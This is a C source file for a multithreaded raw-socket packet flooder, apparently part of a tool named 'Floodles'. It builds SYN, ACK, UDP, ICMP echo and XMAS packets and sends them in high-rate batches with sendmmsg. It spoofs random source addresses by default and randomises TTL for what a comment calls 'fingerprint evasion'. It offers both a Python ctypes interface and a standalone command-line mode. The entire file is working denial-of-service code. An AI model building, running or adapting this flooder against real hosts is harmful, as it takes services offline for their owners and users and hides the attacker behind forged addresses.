/*
 * native/c/sender.c
 * High-performance raw socket sender using sendmmsg(2).
 *
 * sendmmsg() vs sendto():
 *   sendto()   -> 1 syscall per packet  -> kernel context switch per packet
 *   sendmmsg() -> 1 syscall per N packets -> amortized syscall cost
 *   Gain: 3-10x PPS improvement at high rates (>100k PPS)
 *
 * Build:
 *   gcc -O3 -march=native -o sender sender.c -lpthread
 *   or via Makefile: make
 *
 * Usage (standalone):
 *   sudo ./sender --dst 192.168.1.100 --threads 8 --duration 30
 *
 * Usage (Python ctypes):
 *   lib = ctypes.CDLL("./libsender.so")
 *   lib.flood_start(dst_ip, port, threads, pps_limit, duration)
 *   lib.flood_stop()
 *   lib.flood_stats(ctypes.byref(stats))
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <stdatomic.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

/* --------------------------------------------------------------------------
 * Constants
 * -------------------------------------------------------------------------- */

#define BATCH_SIZE      256         /* Packets per sendmmsg() call         */
#define MAX_PKT_SIZE    1500        /* Max ethernet frame payload           */
#define MAX_THREADS     64

/* --------------------------------------------------------------------------
 * Shared state (atomic for thread safety without mutex)
 * -------------------------------------------------------------------------- */

static atomic_long  g_packets_sent  = 0;
static atomic_long  g_bytes_sent    = 0;
static atomic_long  g_errors        = 0;
static atomic_int   g_running       = 1;

typedef struct {
    unsigned long packets;
    unsigned long bytes;
    unsigned long errors;
    double        elapsed_s;
    double        avg_pps;
    double        avg_mbps;
} FloodStats;

/* --------------------------------------------------------------------------
 * Pseudo-random (fast, not crypto)
 * xorshift64 - period 2^64-1, ~3 cycles per call
 * -------------------------------------------------------------------------- */

static __thread uint64_t _rng_state = 0;

static inline uint64_t fast_rand(void) {
    if (_rng_state == 0) _rng_state = (uint64_t)pthread_self() ^ (uint64_t)time(NULL);
    _rng_state ^= _rng_state << 13;
    _rng_state ^= _rng_state >> 7;
    _rng_state ^= _rng_state << 17;
    return _rng_state;
}

static inline uint32_t rand_ip(void) {
    /* Avoid private ranges (simplified) */
    uint8_t a;
    do { a = fast_rand() & 0xFF; } while (a == 10 || a == 127 || a == 0 || a >= 224);
    return (a << 24) | ((fast_rand() & 0xFF) << 16) |
           ((fast_rand() & 0xFF) << 8)  |  (fast_rand() & 0xFE | 1);
}

static inline uint16_t rand_port(void) {
    return (uint16_t)(1024 + (fast_rand() % 64511));
}

/* --------------------------------------------------------------------------
 * Checksum (RFC 1071)
 * -------------------------------------------------------------------------- */

static uint16_t ip_checksum(const void *data, size_t len) {
    const uint16_t *ptr = (const uint16_t *)data;
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len)         sum += *(const uint8_t *)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

/* TCP pseudo-header for checksum */
struct tcp_pseudo {
    uint32_t src;
    uint32_t dst;
    uint8_t  zero;
    uint8_t  proto;
    uint16_t tcp_len;
};

static uint16_t tcp_checksum(const struct iphdr *ip, const struct tcphdr *tcp,
                              size_t tcp_len) {
    struct tcp_pseudo ph = {
        .src     = ip->saddr,
        .dst     = ip->daddr,
        .zero    = 0,
        .proto   = IPPROTO_TCP,
        .tcp_len = htons((uint16_t)tcp_len),
    };
    uint8_t buf[sizeof(ph) + tcp_len];
    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), tcp, tcp_len);
    return ip_checksum(buf, sizeof(buf));
}

/* --------------------------------------------------------------------------
 * Packet builders
 * -------------------------------------------------------------------------- */

typedef enum {
    PKT_SYN,
    PKT_ACK,
    PKT_UDP,
    PKT_ICMP,
    PKT_XMAS,
} PktType;

/* Build a packet into buf, returns total packet length */
static int build_packet(uint8_t *buf, uint32_t dst_ip, uint16_t dst_port,
                        PktType type, int spoof) {
    memset(buf, 0, MAX_PKT_SIZE);

    struct iphdr  *ip  = (struct iphdr  *)buf;
    uint32_t src_ip = spoof ? rand_ip() : 0;  /* 0 = kernel fills */

    /* --- Common IP header --- */
    ip->ihl      = 5;
    ip->version  = 4;
    ip->ttl      = 64 + (fast_rand() & 63);  /* 64-127, fingerprint evasion */
    ip->saddr    = htonl(src_ip);
    ip->daddr    = htonl(dst_ip);
    ip->id       = (uint16_t)fast_rand();
    ip->frag_off = 0;

    if (type == PKT_SYN || type == PKT_ACK || type == PKT_XMAS) {
        /* TCP */
        struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
        size_t tcp_len = sizeof(struct tcphdr);

        ip->protocol = IPPROTO_TCP;
        tcp->source  = htons(rand_port());
        tcp->dest    = htons(dst_port);
        tcp->seq     = htonl((uint32_t)fast_rand());
        tcp->ack_seq = htonl((uint32_t)fast_rand());
        tcp->doff    = 5;
        tcp->window  = htons(8192);

        switch (type) {
            case PKT_SYN:  tcp->syn = 1; break;
            case PKT_ACK:  tcp->ack = 1; break;
            case PKT_XMAS:
                tcp->fin = tcp->syn = tcp->rst = 1;
                tcp->psh = tcp->ack = tcp->urg = 1;
                break;
            default: break;
        }

        ip->tot_len  = htons(sizeof(struct iphdr) + tcp_len);
        ip->check    = ip_checksum(ip, sizeof(struct iphdr));
        tcp->check   = tcp_checksum(ip, tcp, tcp_len);
        return sizeof(struct iphdr) + tcp_len;

    } else if (type == PKT_UDP) {
        struct udphdr *udp = (struct udphdr *)(buf + sizeof(struct iphdr));
        /* 512-byte payload after UDP header */
        size_t payload_len = 512;
        size_t udp_len     = sizeof(struct udphdr) + payload_len;

        ip->protocol = IPPROTO_UDP;
        udp->source  = htons(rand_port());
        udp->dest    = htons(dst_port);
        udp->len     = htons((uint16_t)udp_len);
        udp->check   = 0;   /* UDP checksum optional for IPv4 */

        /* Random payload */
        uint8_t *payload = buf + sizeof(struct iphdr) + sizeof(struct udphdr);
        for (size_t i = 0; i < payload_len; i++)
            payload[i] = (uint8_t)fast_rand();

        ip->tot_len  = htons(sizeof(struct iphdr) + udp_len);
        ip->check    = ip_checksum(ip, sizeof(struct iphdr));
        return sizeof(struct iphdr) + udp_len;

    } else {
        /* ICMP echo */
        uint8_t *icmp = buf + sizeof(struct iphdr);
        size_t icmp_len = 64;

        ip->protocol = IPPROTO_ICMP;
        ip->tot_len  = htons(sizeof(struct iphdr) + icmp_len);

        icmp[0] = 8;    /* type: echo request */
        icmp[1] = 0;    /* code */
        icmp[2] = icmp[3] = 0; /* checksum placeholder */
        /* Random payload */
        for (size_t i = 4; i < icmp_len; i++) icmp[i] = (uint8_t)fast_rand();
        /* Checksum */
        uint16_t cksum = ip_checksum(icmp, icmp_len);
        icmp[2] = cksum & 0xFF;
        icmp[3] = (cksum >> 8) & 0xFF;

        ip->check = ip_checksum(ip, sizeof(struct iphdr));
        return sizeof(struct iphdr) + icmp_len;
    }
}

/* --------------------------------------------------------------------------
 * Thread worker
 * -------------------------------------------------------------------------- */

typedef struct {
    uint32_t  dst_ip;
    uint16_t  dst_port;
    PktType   type;
    int       spoof;
    long      pps_limit;    /* 0 = unlimited */
} WorkerArgs;

static void *flood_worker(void *arg) {
    WorkerArgs *a = (WorkerArgs *)arg;

    /* Open raw socket */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    /* Increase socket send buffer to 16 MB */
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    /* Destination address */
    struct sockaddr_in dst = {
        .sin_family      = AF_INET,
        .sin_addr.s_addr = htonl(a->dst_ip),
        .sin_port        = 0,
    };

    /* Pre-allocate batch buffers */
    uint8_t            pkts[BATCH_SIZE][MAX_PKT_SIZE];
    struct iovec       iovs[BATCH_SIZE];
    struct mmsghdr     msgs[BATCH_SIZE];
    struct sockaddr_in addrs[BATCH_SIZE];

    memset(msgs,  0, sizeof(msgs));
    memset(addrs, 0, sizeof(addrs));

    /* Rate control */
    double interval = (a->pps_limit > 0)
        ? (double)BATCH_SIZE / (double)a->pps_limit
        : 0.0;

    while (atomic_load(&g_running)) {
        struct timespec t0;
        if (interval > 0) clock_gettime(CLOCK_MONOTONIC, &t0);

        /* Build batch */
        for (int i = 0; i < BATCH_SIZE; i++) {
            int pkt_len = build_packet(pkts[i], a->dst_ip, a->dst_port,
                                       a->type, a->spoof);
            iovs[i].iov_base  = pkts[i];
            iovs[i].iov_len   = pkt_len;
            addrs[i]          = dst;
            msgs[i].msg_hdr.msg_name    = &addrs[i];
            msgs[i].msg_hdr.msg_namelen = sizeof(dst);
            msgs[i].msg_hdr.msg_iov     = &iovs[i];
            msgs[i].msg_hdr.msg_iovlen  = 1;
        }

        /* Send batch */
        int sent = sendmmsg(sock, msgs, BATCH_SIZE, 0);
        if (sent > 0) {
            atomic_fetch_add(&g_packets_sent, sent);
            for (int i = 0; i < sent; i++)
                atomic_fetch_add(&g_bytes_sent, msgs[i].msg_len);
        } else {
            atomic_fetch_add(&g_errors, 1);
        }

        /* Rate limiting: sleep remainder of interval */
        if (interval > 0) {
            struct timespec t1;
            clock_gettime(CLOCK_MONOTONIC, &t1);
            double elapsed = (t1.tv_sec - t0.tv_sec)
                           + (t1.tv_nsec - t0.tv_nsec) * 1e-9;
            double remaining = interval - elapsed;
            if (remaining > 0) {
                struct timespec ts = {
                    .tv_sec  = (time_t)remaining,
                    .tv_nsec = (long)((remaining - (time_t)remaining) * 1e9),
                };
                nanosleep(&ts, NULL);
            }
        }
    }

    close(sock);
    return NULL;
}

/* --------------------------------------------------------------------------
 * Public API (called from Python ctypes or standalone)
 * -------------------------------------------------------------------------- */

static pthread_t  g_threads[MAX_THREADS];
static WorkerArgs g_args;
static int        g_nthreads = 0;
static time_t     g_start    = 0;

int flood_start(const char *dst_ip_str, int port, int threads,
                long pps_limit, int duration, int pkt_type, int spoof) {
    struct in_addr addr;
    if (inet_aton(dst_ip_str, &addr) == 0) return -1;

    g_args.dst_ip    = ntohl(addr.s_addr);
    g_args.dst_port  = (uint16_t)port;
    g_args.type      = (PktType)pkt_type;
    g_args.spoof     = spoof;
    g_args.pps_limit = pps_limit;

    atomic_store(&g_running, 1);
    atomic_store(&g_packets_sent, 0);
    atomic_store(&g_bytes_sent, 0);
    atomic_store(&g_errors, 0);
    g_start    = time(NULL);
    g_nthreads = (threads > MAX_THREADS) ? MAX_THREADS : threads;

    for (int i = 0; i < g_nthreads; i++) {
        if (pthread_create(&g_threads[i], NULL, flood_worker, &g_args) != 0)
            return -1;
    }

    if (duration > 0) {
        sleep(duration);
        atomic_store(&g_running, 0);
    }

    return 0;
}

void flood_stop(void) {
    atomic_store(&g_running, 0);
    for (int i = 0; i < g_nthreads; i++)
        pthread_join(g_threads[i], NULL);
}

void flood_stats(FloodStats *out) {
    out->packets   = atomic_load(&g_packets_sent);
    out->bytes     = atomic_load(&g_bytes_sent);
    out->errors    = atomic_load(&g_errors);
    out->elapsed_s = difftime(time(NULL), g_start);
    out->avg_pps   = out->elapsed_s > 0 ? out->packets / out->elapsed_s : 0.0;
    out->avg_mbps  = out->elapsed_s > 0
                   ? (out->bytes * 8.0) / (out->elapsed_s * 1e6) : 0.0;
}

/* --------------------------------------------------------------------------
 * Standalone main (for testing without Python)
 * -------------------------------------------------------------------------- */

#ifdef BUILD_STANDALONE

static void sig_handler(int s) { (void)s; atomic_store(&g_running, 0); }

int main(int argc, char *argv[]) {
    const char *dst   = "127.0.0.1";
    int port          = 80;
    int threads       = 4;
    int duration      = 10;
    long pps_limit    = 0;
    int pkt_type      = PKT_SYN;  /* 0=SYN 1=ACK 2=UDP 3=ICMP 4=XMAS */
    int spoof         = 1;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--dst")      && i+1 < argc) dst       = argv[++i];
        else if (!strcmp(argv[i], "--port")     && i+1 < argc) port      = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--threads")  && i+1 < argc) threads   = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--duration") && i+1 < argc) duration  = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--pps")      && i+1 < argc) pps_limit = atol(argv[++i]);
        else if (!strcmp(argv[i], "--type")     && i+1 < argc) pkt_type  = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--no-spoof"))               spoof     = 0;
    }

    printf("[*] Floodles native sender\n");
    printf("    dst=%s:%d  threads=%d  duration=%ds  pps_limit=%ld  type=%d\n",
           dst, port, threads, duration, pps_limit, pkt_type);

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    flood_start(dst, port, threads, pps_limit, duration, pkt_type, spoof);
    flood_stop();

    FloodStats s;
    flood_stats(&s);
    printf("\n[+] packets=%lu  bytes=%lu  errors=%lu  elapsed=%.1fs  "
           "avg_pps=%.1f  avg_mbps=%.3f\n",
           s.packets, s.bytes, s.errors, s.elapsed_s, s.avg_pps, s.avg_mbps);
    return 0;
}
#endif
